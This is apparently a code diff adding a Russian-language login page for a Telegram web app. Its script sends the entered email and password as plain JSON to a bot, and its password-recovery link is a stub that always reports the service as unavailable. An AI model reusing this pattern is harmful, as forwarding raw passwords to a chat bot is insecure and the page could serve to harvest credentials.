@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Авторизация</title>
+    <style>
+        body {
+            font-family: 'Times New Roman', serif;
+            background-image: url('your-background-image.jpg');
+            background-size: cover;
+            color: white;
+        }
+        .container {
+            max-width: 300px;
+            margin: 50px auto;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 10px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Авторизация</h2>
+        <input type="email" id="email" placeholder="Почта">
+        <input type="password" id="password" placeholder="Пароль">
+        <button onclick="login()">Войти</button>
+        <p><a href="#" onclick="showRecovery()">Забыли пароль?</a></p>
+        <p><a href="register.html">Регистрация</a></p>
+    </div>
+
+    <script>
+        function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const data = { email, password };
+
+            // Отправляем данные в бот
+            Telegram.WebApp.sendData(JSON.stringify(data));
+            Telegram.WebApp.close();
+        }
+
+        function showRecovery() {
+            alert('Сервис временно недоступен. Попробуйте позже.');
+        }
+    </script>
+</body>
+</html>
